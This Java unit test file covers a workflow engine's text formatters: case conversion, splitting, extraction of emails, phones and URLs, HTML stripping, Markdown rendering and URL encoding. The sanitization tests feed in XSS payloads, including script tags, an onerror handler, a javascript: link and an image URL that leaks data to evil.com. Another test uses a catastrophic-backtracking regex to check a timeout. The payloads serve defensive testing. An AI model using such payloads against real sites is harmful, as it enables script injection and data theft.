package com.ieum.workflowcore.engine.executor;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.time.Clock;
import java.time.Instant;
import java.time.ZonedDateTime;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.Timeout;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

class TextFormatsTest {

    private static final ZonedDateTime NOW =
        ZonedDateTime.now(Clock.fixed(Instant.parse("2026-11-07T04:30:00Z"), ConditionValues.KST));

    private static Object out(String event, Object... kv) {
        Map<String, Object> in = new HashMap<>();
        for (int i = 0; i < kv.length; i += 2) {
            in.put((String) kv[i], kv[i + 1]);
        }
        return Formatter.apply("formatter." + event, in, NOW).get("output");
    }

    @Test
    @DisplayName("text_case: 단어마다·첫 글자만·기본값 title·한글 유지")
    void textCase() {
        assertThat(out("text_case", "input", "hello wORLD", "mode", "title")).isEqualTo("Hello World");
        assertThat(out("text_case", "input", "hello wORLD", "mode", "capitalize")).isEqualTo("Hello wORLD");
        assertThat(out("text_case", "input", "hello wORLD")).isEqualTo("Hello World");
        assertThat(out("text_case", "input", "한글 abc", "mode", "upper")).isEqualTo("한글 ABC");
        assertThat(out("text_case", "input", "ABC", "mode", "lower")).isEqualTo("abc");
    }

    @Test
    @DisplayName("text_trim: 앞뒤 공백만 지운다")
    void textTrim() {
        assertThat(out("text_trim", "input", "  a  b \n")).isEqualTo("a  b");
    }

    @Test
    @DisplayName("text_replace: 글자 그대로, 표기 지원, 빈 replace는 지우기, 빈 find는 실패")
    void textReplace() {
        assertThat(out("text_replace", "input", "a b", "find", "[:space:]", "replace", "_")).isEqualTo("a_b");
        assertThat(out("text_replace", "input", "a b", "find", "[:space:]")).isEqualTo("ab");
        assertThat(out("text_replace", "input", "a.b", "find", ".", "replace", "-")).isEqualTo("a-b");
        assertThat(out("text_replace", "input", "a\nb\tc", "find", "[:newline:]", "replace", "[:tab:]")).isEqualTo("a\tb\tc");
        assertThatThrownBy(() -> out("text_replace", "input", "a", "find", ""))
            .isInstanceOf(FormatterFailure.class)
            .hasMessageContaining("찾아 바꾸기:");
    }

    @Test
    @DisplayName("text_replace: 결과가 10만 자를 넘으면 만들기 전에 실패한다")
    void replaceResultOverLimitFails() {
        assertThatThrownBy(() -> out("text_replace", "input", "a".repeat(50_000), "find", "a", "replace", "b".repeat(50_000)))
            .isInstanceOf(FormatterFailure.class)
            .hasMessageContaining("10만 자");
    }

    @Test
    @DisplayName("text_truncate: grapheme 단위, 말줄임표 포함 길이, 0은 실패")
    void textTruncate() {
        assertThat(out("text_truncate", "input", "👨‍👩‍👧가나다", "maxLength", 2)).isEqualTo("👨‍👩‍👧가");
        assertThat(out("text_truncate", "input", "가나다라", "maxLength", 3, "ellipsis", true)).isEqualTo("가나…");
        assertThat(out("text_truncate", "input", "가나", "maxLength", 3, "ellipsis", true)).isEqualTo("가나");
        assertThatThrownBy(() -> out("text_truncate", "input", "abc", "maxLength", 0))
            .isInstanceOf(FormatterFailure.class);
        assertThatThrownBy(() -> out("text_truncate", "input", "abc", "maxLength", "abc"))
            .isInstanceOf(FormatterFailure.class);
    }

    @Test
    @DisplayName("text_split: 첫째·둘째·마지막·전부, 없는 조각은 빈 값")
    void textSplit() {
        assertThat(out("text_split", "input", "a, b ,c", "part", "first")).isEqualTo("a");
        assertThat(out("text_split", "input", "a, b ,c", "part", "second")).isEqualTo("b");
        assertThat(out("text_split", "input", "a, b ,c", "part", "last")).isEqualTo("c");
        assertThat(out("text_split", "input", "a, b ,c", "part", "all")).isEqualTo(List.of("a", "b", "c"));
        assertThat(out("text_split", "input", "a", "part", "second")).isEqualTo("");
        assertThat(out("text_split", "input", "a,b")).isEqualTo("a");
        assertThat(out("text_split", "input", "a|b", "separator", "|", "part", "last")).isEqualTo("b");
    }

    @Test
    @DisplayName("text_default: 비면 기본값, 아니면 그대로, 기본값 빈 값은 실패")
    void textDefault() {
        assertThat(out("text_default", "input", "", "defaultValue", "없음")).isEqualTo("없음");
        assertThat(out("text_default", "input", "[]", "defaultValue", "없음")).isEqualTo("없음");
        assertThat(out("text_default", "input", "x", "defaultValue", "없음")).isEqualTo("x");
        assertThatThrownBy(() -> out("text_default", "input", "x", "defaultValue", ""))
            .isInstanceOf(FormatterFailure.class);
    }

    @Test
    @DisplayName("text_extract: 이메일·전화·URL·숫자, 없으면 빈 값")
    void textExtract() {
        String mail = "문의 a.b@x.co.kr 또는 c@d.com";
        assertThat(out("text_extract", "input", mail, "kind", "email")).isEqualTo("a.b@x.co.kr");
        assertThat(out("text_extract", "input", mail, "kind", "email", "all", true))
            .isEqualTo(List.of("a.b@x.co.kr", "c@d.com"));
        assertThat(out("text_extract", "input", "연락 010-1234-5678, 02)345-6789, 1588-1234", "kind", "phone", "all", true))
            .isEqualTo(List.of("010-1234-5678", "02)345-6789", "1588-1234"));
        assertThat(out("text_extract", "input", "보기 https://ex.com/a?b=1.", "kind", "url"))
            .isEqualTo("https://ex.com/a?b=1");
        assertThat(out("text_extract", "input", "총 1,200원 중 3.5", "kind", "number", "all", true))
            .isEqualTo(List.of("1,200", "3.5"));
        assertThat(out("text_extract", "input", "없음", "kind", "email")).isEqualTo("");
        assertThat(out("text_extract", "input", "없음", "kind", "email", "all", true)).isEqualTo(List.of());
        assertThatThrownBy(() -> out("text_extract", "input", "a"))
            .isInstanceOf(FormatterFailure.class);
    }

    @Test
    @DisplayName("text_extract phone: 카드·계좌번호 블록은 뽑지 않고 +82·괄호 지역번호는 원문 그대로")
    void extractPhoneBoundaries() {
        assertThat(out("text_extract", "input", "결제카드 4579-1723-4567-8901 승인", "kind", "phone", "all", true))
            .isEqualTo(List.of());
        assertThat(out("text_extract", "input", "카드 4579-010-1234-5678", "kind", "phone", "all", true))
            .isEqualTo(List.of());
        assertThat(out("text_extract", "input", "계좌 110-012-3456-7890", "kind", "phone", "all", true))
            .isEqualTo(List.of());
        assertThat(out("text_extract", "input", "+82 010-1234-5678", "kind", "phone")).isEqualTo("+82 010-1234-5678");
        assertThat(out("text_extract", "input", "02) 345-6789", "kind", "phone")).isEqualTo("02) 345-6789");
    }

    @Test
    @DisplayName("text_extract url: 짝 없는 닫는 괄호·뒤 조사는 떼고, 짝 있는 괄호는 두고, 호스트 없으면 버린다")
    void extractUrlBrackets() {
        assertThat(out("text_extract", "input", "홈페이지(https://ex.com/a)를 참고", "kind", "url")).isEqualTo("https://ex.com/a");
        assertThat(out("text_extract", "input", "[여기](https://ex.com/a)에서", "kind", "url")).isEqualTo("https://ex.com/a");
        assertThat(out("text_extract", "input", "https://en.wikipedia.org/wiki/Java_(programming_language)", "kind", "url"))
            .isEqualTo("https://en.wikipedia.org/wiki/Java_(programming_language)");
        assertThat(out("text_extract", "input", "https://...", "kind", "url")).isEqualTo("");
    }

    @Test
    @Timeout(value = 5, unit = TimeUnit.SECONDS)
    @DisplayName("text_extract email: 긴 반복 입력도 선형으로 끝나 빈 결과")
    void extractEmailLinear() {
        assertThat(out("text_extract", "input", "a".repeat(90_000), "kind", "email", "all", true)).isEqualTo(List.of());
        assertThat(out("text_extract", "input", "a@" + "a.".repeat(44_990), "kind", "email", "all", true))
            .isEqualTo(List.of());
    }

    @Test
    @Timeout(value = 5, unit = TimeUnit.SECONDS)
    @DisplayName("text_extract: 큰 입력에서도 1초 상한 안에 끝난다")
    void extractLargeInputWithinTime() {
        String html = "<a href=x>".repeat(9_000);
        try {
            assertThat(out("text_extract", "input", html, "kind", "url", "all", true)).isEqualTo(List.of());
        } catch (FormatterFailure e) {
            assertThat(e).hasMessageContaining("1초");
        }
    }

    @Test
    @DisplayName("text_extract_pattern: 매치 전체, 길이·문법·시간 실패")
    void textExtractPattern() {
        String s = "a 123-4567 b 765-4321";
        assertThat(out("text_extract_pattern", "input", s, "pattern", "\\d{3}-\\d{4}")).isEqualTo("123-4567");
        assertThat(out("text_extract_pattern", "input", s, "pattern", "\\d{3}-\\d{4}", "all", true))
            .isEqualTo(List.of("123-4567", "765-4321"));
        assertThatThrownBy(() -> out("text_extract_pattern", "input", s, "pattern", "a".repeat(201)))
            .isInstanceOf(FormatterFailure.class);
        assertThatThrownBy(() -> out("text_extract_pattern", "input", s, "pattern", "("))
            .isInstanceOf(FormatterFailure.class)
            .hasMessageContaining("패턴 오류");
        // (a+)+$는 JDK 9+ 메모이제이션으로 즉시 끝난다 — 범위 반복 중첩으로 파국 백트래킹을 낸다.
        long start = System.nanoTime();
        assertThatThrownBy(() -> out("text_extract_pattern", "input", "a".repeat(40) + "!", "pattern", "(a{1,30}){1,30}$"))
            .isInstanceOf(FormatterFailure.class)
            .hasMessageContaining("1초");
        assertThat((System.nanoTime() - start) / 1_000_000).isLessThan(3_000);
    }

    @Test
    @DisplayName("text_strip_html: 태그·script 버리고 엔티티 풀고 블록·br은 줄바꿈")
    void stripHtml() {
        assertThat(out("text_strip_html", "input",
            "<p>안녕 &amp; <b>반가워</b></p><script>alert(1)</script><p>둘째</p>")).isEqualTo("안녕 & 반가워\n둘째");
        assertThat(out("text_strip_html", "input", "a<br>b")).isEqualTo("a\nb");
        assertThat(out("text_strip_html", "input", "<style>p{color:red}</style><p>본문</p>")).isEqualTo("본문");
    }

    @Test
    @DisplayName("text_markdown_to_html: 실행 가능한 HTML은 남지 않고 Markdown은 렌더한다")
    void markdownToHtmlRemovesXss() {
        String html = (String) out("text_markdown_to_html", "input",
            "**굵게** <script>alert(1)</script> <img src=x onerror=alert(1)> [x](javascript:alert(1))");
        assertThat(html).contains("<strong>굵게</strong>");
        assertNoExecutableHtml(html);

        String dangling = (String) out("text_markdown_to_html", "input",
            "<div><img src='https://evil.com/leak?x=\n비밀\n'></div>");
        assertNoExecutableHtml(dangling);

        String doc = (String) out("text_markdown_to_html", "input", "# 제목\n- a");
        assertThat(doc).contains("<h1>제목</h1>").contains("<li>a</li>");
    }

    private static void assertNoExecutableHtml(String html) {
        Document doc = Jsoup.parseBodyFragment(html);
        assertThat(doc.select("script")).isEmpty();
        assertThat(doc.select("[onerror], [onload]")).isEmpty();
        assertThat(doc.select("img")).isEmpty();
        assertThat(doc.select("[href^=javascript:]")).isEmpty();
    }

    @Test
    @DisplayName("text_url_encode: 공백은 %20, 왕복, 잘못된 인코딩은 실패")
    void urlEncode() {
        assertThat(out("text_url_encode", "input", "a b&가")).isEqualTo("a%20b%26%EA%B0%80");
        assertThat(out("text_url_encode", "input", "a%20b%26%EA%B0%80", "direction", "decode")).isEqualTo("a b&가");
        assertThatThrownBy(() -> out("text_url_encode", "input", "%E", "direction", "decode"))
            .isInstanceOf(FormatterFailure.class);
    }

    @Test
    @DisplayName("text_length: grapheme 수와 단어 수를 Long으로")
    void textLength() {
        assertThat(out("text_length", "input", "👍한글")).isEqualTo(3L);
        assertThat(out("text_length", "input", " a  b\nc ", "unit", "words")).isEqualTo(3L);
        assertThat(out("text_length", "input", "")).isEqualTo(0L);
        assertThat(out("text_length", "input", "", "unit", "words")).isEqualTo(0L);
    }

    @Test
    @DisplayName("빈 입력: 12개 모두 실패하지 않는다")
    void emptyInputSucceeds() {
        assertThat(out("text_case", "input", "")).isEqualTo("");
        assertThat(out("text_trim", "input", "")).isEqualTo("");
        assertThat(out("text_replace", "input", "", "find", "a")).isEqualTo("");
        assertThat(out("text_truncate", "input", "", "maxLength", 3)).isEqualTo("");
        assertThat(out("text_split", "input", "")).isEqualTo("");
        assertThat(out("text_split", "input", "", "part", "all")).isEqualTo(List.of());
        assertThat(out("text_default", "input", "", "defaultValue", "d")).isEqualTo("d");
        assertThat(out("text_extract", "input", "", "kind", "email")).isEqualTo("");
        assertThat(out("text_extract", "input", "", "kind", "email", "all", true)).isEqualTo(List.of());
        assertThat(out("text_extract_pattern", "input", "", "pattern", "a")).isEqualTo("");
        assertThat(out("text_strip_html", "input", "")).isEqualTo("");
        assertThat(out("text_markdown_to_html", "input", "")).isEqualTo("");
        assertThat(out("text_url_encode", "input", "")).isEqualTo("");
        assertThat(out("text_length", "input", "")).isEqualTo(0L);
    }
}
